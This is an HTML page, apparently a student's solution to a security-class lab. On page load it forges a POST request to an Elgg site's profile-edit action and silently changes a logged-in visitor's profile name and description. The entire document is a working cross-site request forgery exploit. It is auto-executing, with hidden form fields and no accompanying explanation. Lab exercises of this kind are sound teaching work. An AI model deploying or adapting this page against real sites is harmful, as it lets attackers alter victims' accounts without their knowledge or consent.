<html><body><h1>
This page forges an HTTP POST request.
</h1>
<script type="text/javascript">

function post(url,fields) {
	//创建一个<form>元素
	var p = document.createElement("form");
	//构建表单
	p.action = url;
	p.innerHTML = fields;
	p.target = "_self";
	p.method = "post";
	//将表单追加到当前页面
	document.body.appendChild(p);
	//提交表单
	p.submit();
}
function csrf_hack() {
	var fields;
	fields += "<input type='hidden' name='name' value='Boby'>";
	fields += "<input type='hidden' name='description' value='My name is Boby! I have the Information System Security Class!'>";
	fields += "<input type='hidden' name='guid' value='43'>"; 
	var url = "http://www.csrflabelgg.com/action/profile/edit";

	post(url,fields);
}

window.onload = function() { csrf_hack();}

</script>
</body>
</html>
